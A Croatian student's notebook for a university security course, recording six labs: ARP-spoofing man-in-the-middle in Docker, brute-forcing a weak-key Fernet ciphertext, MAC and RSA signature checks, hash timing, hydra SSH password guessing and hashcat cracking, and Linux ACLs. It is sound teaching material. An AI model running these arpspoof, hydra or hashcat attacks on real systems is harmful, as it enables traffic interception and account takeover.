# SRP labovi

# 1. laboratorijske vježbe

October 12, 2021 

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola. 

Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): dvije žrtve station-1 i station-2 te napadač evil-station.

- kloniranje Github repozitorija:

```bash
$ git clone https://github.com/mcagalj/SRP-2021-22
```

- promjena direktorija:

```bash
$ cd SRP-2021-22/arp-spoofing/
```

- pokretanje/zaustavljanje virtualiziranog mrežnog scenarija:

```bash
$ chmod +X ./start.sh
$ ./start.sh
$ chmod +X ./stop.sh
$ ./stop.sh
```

- pokretanje shella, dohvat IP adrese i adrese uređaja:

```bash

$ docker ps exec -it sh

$ ifconfig -a
```

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.24.0.2  netmask 255.255.0.0  broadcast 172.24.255.255
        ether 02:42:ac:18:00:02  txqueuelen 0  (Ethernet)
```

- provjera je li station-2 na istoj adresi:

```bash
$ ping station-2
```

- pokretanje shella u drugom kontejneru:

```bash
$ docker exec -it station-2 sh
```

- otvaranje servera i klijenta (pomoću netcata):

```bash
$ netcat -lp 9000
$ netcat station-1 9000
```

- pokretanje shella u trećem kontejneru:

```bash
$ docker exec -it evil-station sh
```

- arp spoofing (napad):

```bash
$ arpspoof -t station-1 station-2
$ tcpdump
```

- evil-station sada može očitavati poruke koje si međusobno šalju station-1 i station-2 bez njihovog saznanja o tome (ako evil-station tako poželi, tj. ako proslijedi dalje poruke koje je presreo)
- prekid napada:

```bash
$ echo 0 > /proc/sys/net/ipv4/ip_forward
```

🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐

# 2. laboratorijske vježbe

October 26, 2021 

U sklopu vježbe student će riješiti odgovarajući *crypto* izazov, odnosno dešifrirati odgovarajući *ciphertext* u kontekstu simetrične kriptografije. Izazov počiva na činjenici da student nema pristup enkripcijskom ključu.

Za pripremu *crypto* izazova, odnosno enkripciju korištena je Python biblioteka `[cryptography](https://cryptography.io/en/latest/)`. *Plaintext* koji student treba otkriti enkriptiran je korištenjem *high-level* sustava za simetričnu enkripciju iz navedene biblioteke - [Fernet](https://cryptography.io/en/latest/fernet/).

Fernet koristi sljedeće *low-level* kriptografske mehanizme:

- AES šifru sa 128 bitnim ključem
- CBC enkripcijski način rada
- HMAC sa 256 bitnim ključem za zaštitu integriteta poruka
- Timestamp za osiguravanje svježine (*freshness*) poruka

U ovom dijelu vježbi, najprije ćemo se kratko upoznati sa načinom na koji možete enkriptirati i dekriptirati poruke korištenjem Fernet sustava.

Rad u Pythonu(v3).

- instaliranje kriptografijskog modula i pokretanje Python-a:

```bash
$ pip install cryptography
$ python
```

- vježba enkripcije i dekripcije plaintext-a:

```python
$ from cryptography.fernet import Fernet
$ plaintext = b"hello world"
$ ciphertext = f.encrypt(plaintext)
$ ciphertext
b'gAAAAABhd8p8KqK_-nK5frGwI8OITZAFuvSSo645LOcTCDuuSHymEkt6nY4dp4jKODdaoFAZXHtXLQFTqsjSeJwsBhDuJ4ADEw=='
$ f.decrypt(ciphertext)
b'hello world'
```

- preuzimanje osobnog challenge-a na lokalno računalo:

```python
from cryptography.hazmat.primitives import hashes

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256())
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

if __name__ == "__main__":
    h = hash('juric_marino')
    print(h)
```

```python
$ python brute_force.py
1b7fcafff48334c38b3aa1cc7582090ee7a5c9317e1a2ac39cc78b6fd93e544c
```

- 1b7fcafff48334c38b3aa1cc7582090ee7a5c9317e1a2ac39cc78b6fd93e544c je moj osobni folder na serveru
- dekripcija challenge-a:

```python
import base64

def brute_force():
    ctr = 0
    while True:
        key_bytes = ctr.to_bytes(32, "big")
        key = base64.urlsafe_b64encode(key_bytes)
        if not (ctr + 1) % 1000:
            print(f"[*] Keys tested: {ctr+ 1:,}", end="\r")
        # Now initialize the Fernet system with the given key
        # and try to decrypt your challenge.
        # Think, how do you know that the key tested is the correct key
        # (i.e., how do you break out of this infinite loop)?

        ctr += 1

if __name__ == "__main__":
    brute_force()
```

```python
$ python brute_force.py
[*] Keys tested: 51,012,000
```

- Za enkripciju smo koristili **ključeve ograničene entropije - 22 bita**
- konačan program za enkripciju u Python-u:

```python
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256())
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

def test_png(header):
    if header.startswith(b"\211PNG\r\n\032\n"):
        return true

def brute_force():
    filename = "1b7fcafff48334c38b3aa1cc7582090ee7a5c9317e1a2ac39cc78b6fd93e544c.encrypted"
    with open(filename, "rb") as file:
        ciphertext = file.read()
        # Now do something with the ciphertext

    ctr = 0
    while True:
        key_bytes = ctr.to_bytes(32, "big")
        key = base64.urlsafe_b64encode(key_bytes)
        if not (ctr + 1) % 1000:
            print(f"[*] Keys tested: {ctr+ 1:,}", end="\r")
        # Now initialize the Fernet system with the given key
        # and try to decrypt your challenge.
        # Think, how do you know that the key tested is the correct key
        # (i.e., how do you break out of this infinite loop)?

        try:
            plaintext = Fernet(key).decrypt(ciphertext)
            header = plaintext[:32]

            if test_png(header):
                print(f"[+] KEY FOUND: {key}")
                # Writing to a file
                with open("BINGO.png", "wb") as file:
                    file.write(plaintext)
                break
        except Exception:
            pass

        ctr += 1

if __name__ == "__main__":
    brute_force()
```

- u terminalu pokrenemo brute_force() napad i čekamo dok se petlja ne izvrši, kada se zaustavi to znači da smo uspješno dekriptirali naš challenge što možemo i provjeriti pronalazeći datoteku (u ovom slučaju sliku) na lokalnom računalu

🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐

# 3. laboratorijske vježbe

November 9, 2021 

Cilj vježbe je primjeniti teoreteske spoznaje o osnovnim kritografskim mehanizmima za autentikaciju i zaštitu integriteta poruka u praktičnom primjerima. Pri tome ćemo koristiti simetrične i asimetrične krito mehanizme: *message authentication code (MAC)* i *digitalne potpise* zasnovane na javnim ključevima.

### Izazov 1

- Implementirajmo zaštitu integriteta sadržaja dane poruke primjenom odgovarajućeg *message authentication code (MAC)* algoritma. Pri tome koristimo HMAC mehanizam iz Python biblioteka `[cryptography](https://cryptography.io/en/latest/hazmat/primitives/mac/hmac/)`.
- U lokalnom direktoriju smo kreirali tekstualnu datoteku odgovarajućeg sadržaja čiji integritet želimo zaštititi - message.txt
- u sljedećem kodu:  pišemo funkciju za izračun MAC vrijednosti za danu poruku te funkciju za provjeru validnosti MAC-a za danu poruku:

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True

if __name__ == "__main__":
    key = b"my secret"

    with open("message.txt", "rb") as file:
        content = file.read()

    mac = generate_MAC(key, content)

    with open("message.sig", "wb") as file:
        file.write(mac)
    
    with open("message.sig", "rb") as file:
        signature = file.read()

    is_authentic = verify_MAC(key, signature, content)
    print(is_authentic)
```

- otvaramo datoteku message.txt i učitajemo sadržaj datoteke u memoriju, generiramo `mac`, otvaramo datoteku message.sig i unesemo `mac` te iz tako zapisane datoteke čitamo `content` i spremamo ga u `signature`. Funkcija `verifiy_mac` provjerava je li poruka validna (True) ili je mijenjana (False).

```bash
(marino_juric) C:\Users\A507\marino_juric\marino_juric>python .\message_integrity.py
b'nove mjere'

(marino_juric) C:\Users\A507\marino_juric\marino_juric>python .\message_integrity.py
2441d2233b0d909031654780d28089ecf5545d5e15672d777b2febf1a6995861

(marino_juric) C:\Users\A507\marino_juric\marino_juric>python .\message_integrity.py

(marino_juric) C:\Users\A507\marino_juric\marino_juric>python .\message_integrity.py
True

(marino_juric) C:\Users\A507\marino_juric\marino_juric>python .\message_integrity.py
False
```

- nakon što smo promijenili sadržaj message.txt MAC poruke nije validan i ispisuje se False

### Izazov 2

- U ovom izazovu želimo utvrditi vremenski ispravnu skevencu transakcija sa odgovarajućim dionicama. Digitalno potpisani (primjenom MAC-a) nalozi za pojedine transakcije nalaze se na lokalnom web poslužitelju [http://a507-server.local](http://a507-server.local/).
- Preuzimamo program `wget` dostupan na [wget download](https://eternallybored.org/misc/wget/) i zatim ga pohranjujemo u direktorij gdje ćemo pisati Python skriptu za rješavanje ovog izazova.
- Osobne izazove preuzimamo izvršavanjem sljedeće naredbe u terminalu:
    
    `wget.exe -r -nH -np --reject "index.html*" http://a507-server.local/challenges/<juric_marino>/`
    
- Sa servera preuzimamo personalizirane izazove (direktorij `juric_marino/mac_challege`). Nalozi se nalaze u datotekama označenim kao `order_<n>.txt` a odgovarajući autentikacijski kod (*digitalni potpis*) u datotekama `order_<n>.sig`.
- Tajna vrijednost koja se koristi kao ključ u MAC algoritmu dobivena je iz našeg imena:

```python
key = "juric_marino".encode()
```

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature
import os 

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True

if __name__ == "__main__":
    key = "juric_marino".encode()

    path = os.path.join("challenges", "juric_marino", "mac_challenge")
        
    for ctr in range(1, 11):
        msg_filename = f"order_{ctr}.txt"
        sig_filename = f"order_{ctr}.sig"
        msg_filepath = os.path.join(path, msg_filename)
        sig_filepath = os.path.join(path, sig_filename)

        with open(msg_filepath, "rb") as file:
            msg = file.read()   
        with open(sig_filename, "rb") as file:
            sig = file.read()  

        is_authentic = verify_MAC(key, sig, msg)

        print(f'Message {msg.decode():>45} {"OK" if is_authentic else "NOK":<6}')
```

- spremamo u `path` /challenges/juric_marino/mac_challenge na koji u svakom ponavljanju for petlje join-amo `msg_filename` i `sig_filename` koje se povećavaju kako brojač raste (datoteke se zovu `order_{ctr}.txt` i `order_{ctr}.sig` pri čemu je `ctr` brojač koji se povećava).
- Čitamo iz tih datoteka i spremamo sadržaj u `msg` i `sig` koje zajedno s `key` šaljemo funkciji `verify_mac` koja provjerava je li MAC validan.

### **Digital signatures using public-key cryptography**

U ovom izazovu ćemo odrediti autentičnu sliku (između dvije ponuđene) koju je profesor potpisao svojim privatnim ključem. Odgovarajući javni ključ dostupan je na serveru.

Slike i odgovarajući digitalni potpisi nalaze se u direktoriju `juric-marino\public_key_challenge`. Kao i u prethodnoj vježbi, za rješavanje ove koristimo Python biblioteku `[cryptography](https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa/)` - konkretnije **RSA kriptosustav**.

- učitavanje javnog ključa iz datoteke

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
 
def load_public_key():
    with open("public.pem", "rb") as f:
        PUBLIC_KEY = serialization.load_pem_public_key(
            f.read(), backend=default_backend()
        )
    return PUBLIC_KEY
 
 
print(load_public_key())
```

```bash
(marino_juric) C:\Users\A507\marino_juric\marino_juric>.\digital_signature.py
<cryptography.hazmat.backends.openssl.rsa._RSAPublicKey object at 0x0000019251530CD0>
```

- provjera ispravnosti digitalnog potpisa

```python
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidSignature

def verify_signature_rsa(signature, message):
    PUBLIC_KEY = load_public_key()
    try:
        PUBLIC_KEY.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
    except InvalidSignature:
        return False
    else:
        return True
 
 
with open("image_2.png", "rb") as file:
    image = file.read()
 
 
with open("image_2.sig", "rb") as file:
    signature = file.read()
 
is_authentic = verify_signature_rsa(signature, image)
 
print(is_authentic)
```

```bash
(marino_juric) C:\Users\A507\marino_juric\marino_juric>.\digital_signature.py
True
 
(marino_juric) C:\Users\A507\marino_juric\marino_juric>.\digital_signature.py
False
 
(marino_juric) C:\Users\A507\marino_juric\marino_juric>.\digital_signature.py
False
```

- u terminalu dobivamo odgovor True ili False ovisno o tome je li se određena slika podudara sa digitalno potpisanom slikom

🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐

# 4. laboratorijske vježbe

December 7, 2021 

### **Password-hashing (iterative hashing, salt, memory-hard functions)**

Zaporke/lozinke su najzastupljeniji način autentikacije korisnika. U okviru vježbe upoznati ćemo se pobliže sa osnovnim konceptima relevantnim za sigurnu pohranu lozinki. Usporediti ćemo klasične (*brze*) kriptografske *hash* funkcije sa specijaliziranim (*sporim* i *memorijski zahtjevnim*) kriptografskim funkcijama za sigurnu pohranu zaporki i izvođenje enkripcijskih ključeva (*key derivation function (KDF)*).

Okviran popis aktivnosti; detaljne upute ćemo dati u realnom vremenu:

- Usporedba *brzih* i *sporih* kriptografskih *hash* funkcija.
- Razumijevanje suštine pojmova *spore/brze* funkcije.
- Demonstracija *memory-hard* funkcija.

```bash
(marino_juric) C:\Users\A507\marino_juric\marino_juric>.\password_hashing.py
```

- pokušavamo pokrenuti program ali za njega je potrebno instalirati dodatne pakete

```bash
(marino_juric) C:\Users\A507\marino_juric\marino_juric>pip install prettytable
Collecting prettytable
  Using cached prettytable-2.4.0-py3-none-any.whl (24 kB)
Collecting wcwidth
  Using cached wcwidth-0.2.5-py2.py3-none-any.whl (30 kB)
Installing collected packages: wcwidth, prettytable
Successfully installed prettytable-2.4.0 wcwidth-0.2.5
(marino_juric) C:\Users\A507\marino_juric\marino_juric>pip install passlib
Collecting passlib
  Using cached passlib-1.7.4-py2.py3-none-any.whl (525 kB)
Installing collected packages: passlib
Successfully installed passlib-1.7.4
```

- u terminalu pokrećemo slijedeći kod:

```python
from os import urandom
from prettytable import PrettyTable
from timeit import default_timer as time
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from passlib.hash import sha512_crypt, pbkdf2_sha256, argon2
 
 
def time_it(function):
    def wrapper(*args, **kwargs):
        start_time = time()
        result = function(*args, **kwargs)
        end_time = time()
        measure = kwargs.get("measure")
        if measure:
            execution_time = end_time - start_time
            return result, execution_time
        return result
 
    return wrapper
 
 
@time_it
def aes(**kwargs):
    key = bytes(
        [
            0x00,
            0x01,
            0x02,
            0x03,
            0x04,
            0x05,
            0x06,
            0x07,
            0x08,
            0x09,
            0x0A,
            0x0B,
            0x0C,
            0x0D,
            0x0E,
            0x0F,
        ]
    )
 
    plaintext = bytes(
        [
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
        ]
    )
 
    encryptor = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
    encryptor.update(plaintext)
    encryptor.finalize()
 
 
@time_it
def md5(input, **kwargs):
    digest = hashes.Hash(hashes.MD5(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()
 
 
@time_it
def sha256(input, **kwargs):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()
 
 
@time_it
def sha512(input, **kwargs):
    digest = hashes.Hash(hashes.SHA512(), backend=default_backend())
    digest.update(input)
    hash = digest.finalize()
    return hash.hex()
 
 
@time_it
def pbkdf2(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = b"12QIp/Kd"
    rounds = kwargs.get("rounds", 10000)
    return pbkdf2_sha256.hash(input, salt=salt, rounds=rounds)
 
 
@time_it
def argon2_hash(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = b"0" * 22
    rounds = kwargs.get("rounds", 12)  # time_cost
    memory_cost = kwargs.get("memory_cost", 2 ** 10)  # kibibytes
    parallelism = kwargs.get("rounds", 1)
    return argon2.using(
        salt=salt, rounds=rounds, memory_cost=memory_cost, parallelism=parallelism
    ).hash(input)
 
 
@time_it
def linux_hash_6(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = "12QIp/Kd"
    return sha512_crypt.hash(input, salt=salt, rounds=5000)
 
 
@time_it
def linux_hash(input, **kwargs):
    # For more precise measurements we use a fixed salt
    salt = kwargs.get("salt")
    rounds = kwargs.get("rounds", 5000)
    if salt:
        return sha512_crypt.hash(input, salt=salt, rounds=rounds)
    return sha512_crypt.hash(input, rounds=rounds)
 
 
@time_it
def scrypt_hash(input, **kwargs):
    salt = kwargs.get("salt", urandom(16))
    length = kwargs.get("length", 32)
    n = kwargs.get("n", 2 ** 14)
    r = kwargs.get("r", 8)
    p = kwargs.get("p", 1)
    kdf = Scrypt(salt=salt, length=length, n=n, r=r, p=p)
    hash = kdf.derive(input)
    return {"hash": hash, "salt": salt}
 
 
if __name__ == "__main__":
    ITERATIONS = 100
    password = b"super secret password"
 
    MEMORY_HARD_TESTS = []
    LOW_MEMORY_TESTS = []
 
    TESTS = [
        {"name": "AES", "service": lambda: aes(measure=True)},
        {"name": "HASH_MD5", "service": lambda: sha512(password, measure=True)},
        {"name": "HASH_SHA256", "service": lambda: sha512(password, measure=True)},
        {
            "name": "Linux CRYPT 5k",
            "service": lambda: linux_hash(password, measure=True),
        },
        {
            "name": "Linux CRYPT 1M",
            "service": lambda: linux_hash(password, rounds=10 ** 6, measure=True),
        },
    ]
 
    table = PrettyTable()
    column_1 = "Function"
    column_2 = f"Avg. Time ({ITERATIONS} runs)"
    table.field_names = [column_1, column_2]
    table.align[column_1] = "l"
    table.align[column_2] = "c"
    table.sortby = column_2
 
    for test in TESTS:
        name = test.get("name")
        service = test.get("service")
 
        total_time = 0
        for iteration in range(0, ITERATIONS):
            print(f"Testing {name:>6} {iteration}/{ITERATIONS}", end="\r")
            _, execution_time = service()
            total_time += execution_time
        average_time = round(total_time / ITERATIONS, 6)
        table.add_row([name, average_time])
        print(f"{table}\n\n")
```

- funkcija `@time_it` kazuje koliko vremena treba pozvanoj funckiji da se izvrši
- sve ostale funkcije su kriptografske
- kreirali smo nova 2 testa da vidimo koliko prosječno vremena njima treba u 100 pokretanja:

```python
{"name": "Linux CRYPT 5k", "service": lambda: linux_hash(password, measure=True),},
{"name": "Linux CRYPT 1M", "service": lambda: linux_hash(password, rounds=10 ** 6, measure=True),},
```

```bash
Testing Linux CRYPT 1M 61/100
 
(marino_juric) C:\Users\A507\marino_juric\marino_juric>.\password_hashing.py
+----------+----------------------+
| Function | Avg. Time (100 runs) |
+----------+----------------------+
| AES      |       0.000495       |
+----------+----------------------+
 
 
+----------+----------------------+
| Function | Avg. Time (100 runs) |
+----------+----------------------+
| HASH_MD5 |       3.8e-05        |
| AES      |       0.000495       |
+----------+----------------------+
 
 
+-------------+----------------------+
| Function    | Avg. Time (100 runs) |
+-------------+----------------------+
| HASH_SHA256 |       3.2e-05        |
| HASH_MD5    |       3.8e-05        |
| AES         |       0.000495       |
+-------------+----------------------+
 
 
+----------------+----------------------+
| Function       | Avg. Time (100 runs) |
+----------------+----------------------+
| HASH_SHA256    |       3.2e-05        |
| HASH_MD5       |       3.8e-05        |
| AES            |       0.000495       |
| Linux CRYPT 5k |       0.006936       |
+----------------+----------------------+
 
 
+----------------+----------------------+
| Function       | Avg. Time (100 runs) |
+----------------+----------------------+
| HASH_SHA256    |       3.2e-05        |
| HASH_MD5       |       3.8e-05        |
| AES            |       0.000495       |
| Linux CRYPT 5k |       0.006936       |
| Linux CRYPT 1M |       1.376828       |
+----------------+----------------------+
```

- kao što vidimo brzina je različita kod svih kriptogtafskih hash funkcija
- ako je neka funkcija sporija to ne mora nužno značiti da je i lošija, mala brzina može uvelike povećati sigurnost

🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐

# 5. laboratorijske vježbe

December 26, 2022 

### Online Password Guessing

- Otvorili smo bash shell u WSL i pingali server da provjerimo jesmo li na istoj mreži
- Instalirali smo nmap prema uputama

```bash
sudo apt-get update
sudo apt-get install nmap
```

- nmap je alat otvorenog koda za skeniranje mreže i otkrivanje potencijalnih sigurnosnih ranjivosti
- zatim smo napisali naredbu:

```bash
nmap -v 10.0.15.0/28
```

- i kao odgovor dobili informaciju da je 16 računala na mreži.

```bash
Initiating Ping Scan at 13:20
Scanning 16 hosts [2 ports/host]
Completed Ping Scan at 13:20, 1.21s elapsed (16 total hosts)
```

- ssh - Secure Shell je mrežni protokol koji korisnicima omogućuje uspostavu sigurnog komunikacijskog kanala između dva računala putem računalne mreže.

```bash
ssh Juric_marino@10.0.15.1
```

- ne znamo šifru.
- lozinka može imat 4-6 malih slova
- brute force može ispitati sve kombinacije, ali to će trajati predugo i nema smisla
- instaliramo hydru koja će ispitat tih 321254128 kombinacija.

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l juric_marino -x 4:6:a 10.0.15.1 -V -t 1 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-20 13:39:53
[DATA] max 1 task per 1 server, overall 1 task, 321254128 login tries (l:1/p:321254128), ~321254128 tries per task
[DATA] attacking ssh://10.0.15.5:22/
[ATTEMPT] target 10.0.15.1 - login "juric_marino" - pass "aaaa" - 1 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.1 - login "juric_marino" - pass "aaab" - 2 of 321254128 [child 0] (0/0)
...
```

- potom skinemo rječnik i možemo isprobati lozinke iz dictionaryja skraćenog na 878

```bash
wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g3/

student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l juric_marino -P dictionary/g3/dictionary_online.txt 10.0.15.1 -V -t 4 ssh
[ATTEMPT] target 10.0.15.5 - login "juric_marino" - pass "kajjeg" - 1 of 878 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "juric_marino" - pass "kajttg" - 2 of 878 [child 1] (0/0)
[ATTEMPT] target 10.0.15.5 - login "juric_marino" - pass "kajtze" - 3 of 878 [child 2] (0/0)
```

- nakon određenog vremena smo pronašli lozinku i sada se možemo ulogirati:

```bash
[ATTEMPT] target 10.0.15.1 - login "juric_marino" - pass "jabsle" - 68 of 878 [child 1] (0/0)
[22][ssh] host: 10.0.15.1 login: zupanovic_karmen password: soicly
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-20 13:50:13

student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ ssh juric_marino@10.0.15.1juric_marino@10.0.15.1's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)
Documentation: https://help.ubuntu.com
Management: https://landscape.canonical.com
Support: https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.
To restore this content, you can run the 'unminimize' command.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
juric_marino@host_juric_marino:~$
```

### Offline Password Guessing

- instalirali smo hashcat i otvorili folder u Visual Studio Code
- brute forceom isprobajemo sve kombinacije

```bash
sudo apt-get install hashcat
code .

student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
hashcat (v4.0.1) starting...
```

- pokušamo s dictionary_offline.txt i pronašli smo šifru nakon 29 sekundi

```bash
hashcat --force -m 1800 -a 0 hash.txt dictionary/g3/dictionary_offline.txt --status --status-timer 10

$6$KpWlRjFxrYFIcFV2$fFeRQEO6lGDwxx4BdYspd8ORj3OjL.HqDOGPQvG2OSTa/D0R22ROj/vfTnlvYxfDbeP7b6LrOR8w5zt/en6dT/:abteve
Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$KpWlRjFxrYFIcFV2$fFeRQEO6lGDwxx4BdYspd8ORj3OjL.H...en6dT/
Time.Started.....: Tue Dec 26 14:19:10 2021 (19 secs)
Time.Estimated...: Tue Dec 26 14:19:29 2021 (0 secs)
Guess.Base.......: File (dictionary/g3/dictionary_offline.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....: 88 H/s (9.82ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1664/50078 (3.32%)
Rejected.........: 0/1664 (0.00%)
Restore.Point....: 1536/50078 (3.07%)
Candidates.#1....: ketata -> kklzng
HWMon.Dev.#1.....: N/A
Started: Tue Dec 26 14:19:06 2021
Stopped: Tue Dec 26 14:19:35 2021
```

- pokušamo se logirati kao Jean Doe i uspijemo:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ ssh jean_doe@10.0.15.1jean_doe@10.0.15.1's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)
jean_doe@host_juric_marino:~$ whoami
jean_doe
```

🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐🔐

# 6. laboratorijske vježbe

January 11, 2022 

### **Linux Permissions and ACLs**

- osnovni postupak upravljanja korisničkim računima na Linux OS-u: **kontrola pristupa** datotekama, programima i drugim resursima Linux sustava
- pokrenuli smo WSL i izvođenjem naredbe id
- svakom korisniku pridjeljen je jedinstveni UID i mora biti pripadnik barem jedne grupe. (GID).
- kreirali smo korisnike *alice3* i *bob3* sljedećim naredbama:

```bash
id

sudo adduser alice3
sudo adduser bob3
```

- iz prethodnih naredbi vidimo da je kreiranje novih korisnika moguće isključivo od strane *super user-a*

```bash
su - alice3
su - bob3
```

- Oba korisnika pripadaju samo jednoj grupi, alice3, odnosno bob3.
- kreiranje novog foldera *srp* te unutar tog foldera *file-a* *security.txt.*

```bash
mkdir srp
echo “Hello World” > security.txt
```

- naredbama:

```bash
ls -l srp
ls -l srp/security.txt

getfacl srp
getfacl srp/security.txt
```

- dobili smo uvid u vlasnike resursa i dopuštenja definirana nad njima.

### FILE:

- r (read) → čitanje file-a
- w (write) → pisanje u file
- x (execute) → izvršavanje file-a

### FOLDER:

- r (read) → uvid u sadržaj folder-a
- w (write) → kreiranje novih stvari unutar foldera
- x (execute) → pozicioniranje unutar folder-a
- izvršavanjem naredbe:

```bash
chmod u-r security.txt
```

- oduzeli smo pravo čitanja *file-a* vlasniku istog
- logirali smo se kao Bob i provjerili imamo li pristup file-u security.txt.

```bash
cat /home/alice3/srp/security.txt
```

- Bob je korisnik koji pripada grupi *others.* Ta grupa je imala pravo čitanja *file-a* pa je prethodna naredba uspješno izvedena
- ovisno o tome gdje se trenutno nalazimo, ispravnim pozicioniranjem unutar folder-a srp mogli bismo izvršiti sljedeće:

```bash
chmod u-x .
```

- Bob, korisnik koji pripada grupi *others,* i dalje ima pravo čitanja navedenog *file-a*.
- Alice je izvorna prava dobila naredbom

```bash
chmod u+x  .
```

- Da bismo Bobu onemogućili čitanje file-a, morali smo grupi kojoj Bob pripada oduzeti određena prava.

```bash
chmod o-r security.txt
```

- Boba ćemo dodati u grupu kojoj pripada Alice i dobit će sva prava nad file-om.

```bash
usermod -aG alice3 bob3
```

- izlistom svih prava definiranih nad navedenim folderom vidjeli smo da Bob, odnosno Alice, ne pripadaju grupi shadow što znači da nemaju pristup navedenom folderu.
- Boba smo u ACL datoteke *security.txt* dodali sljedećom naredbom:

```bash
setfacl -m u:bob:r /home/alice3/srp/security.txt
```

- Bob će nakon ove naredbe imati pravo čitanja file-a.
- napravili smo neku novu grupu i nju dodali u ACL datoteke *security.txt*. Kreirali smo grupu *alice_reading_group* i nju dodali u ACL sljedećom naredbom:

```bash
sudo setfacl -m g:alice_reading_group:r /home/alice3/srp/security.txt
```

- Na ovaj način smo sebi olakšali posao jer je sada potrebno samo *user-a* dodati u neku grupu da bi mogao obavljati određene operacije na *file-om/folder-om*.
- Za kraj smo pripremili python skriptu sa sljedećim kodom:

```bash
import os

print('Real (R), effective (E) and saved (S) UIDs:')
print(os.getresuid())

with open('/home/alice/srp/security.txt', 'r') as f:
    print(f.read())
```

- izvršavanjem skripte dobili smo *permission denied*
- trenutno logirani *user* s kojim smo izvršili skriptu nema nikakva prava nad *file-om*.
- Probali smo file pokrenuti i kao user Bob, ali tada nije bilo nikakvih problema zbog toga što Bob ima prava nad tim *file-om*.
- Postoji poseban flag koji nam omogućava da se effective UID uzme od vlasnika tog *file-a* i da se sukladno tome izvrši promjena lozinke.
